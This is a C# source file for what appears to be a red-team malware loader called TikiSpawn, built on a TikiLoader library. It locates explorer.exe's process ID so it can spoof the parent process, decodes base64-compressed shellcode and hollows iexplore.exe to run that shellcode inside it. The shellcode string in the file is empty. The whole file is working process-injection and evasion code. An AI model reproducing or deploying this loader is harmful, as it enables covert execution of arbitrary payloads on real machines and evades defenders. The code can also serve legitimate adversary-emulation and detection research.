using System;
using System.Diagnostics;
using TikiLoader;

public class TikiSpawn
{
    private static int FindProcessPid(string process)
    {
        int pid = 0;
        int session = Process.GetCurrentProcess().SessionId;
        Process[] processes = Process.GetProcessesByName(process);

        foreach (Process proc in processes)
        {
            if (proc.SessionId == session)
            {
                pid = proc.Id;
            }
        }
        
        return pid;
    }

    public static void Flame(string shellcode, string binary)
    {
        int ppid = FindProcessPid("explorer");

        byte[] pic = Generic.DecompressShellcode(Convert.FromBase64String(shellcode));

        if (ppid != 0)
        {
            try
            {
                var hollower = new Hollower();
                hollower.Hollow(binary, pic, ppid);
            }
            catch { }
        }
        else
        {
            return;
        }
    }

    public static void Flame()
    {
        string shellcode = "";
        string binary = @"C:\Program Files\Internet Explorer\iexplore.exe";

        Flame(shellcode, binary);
    }
}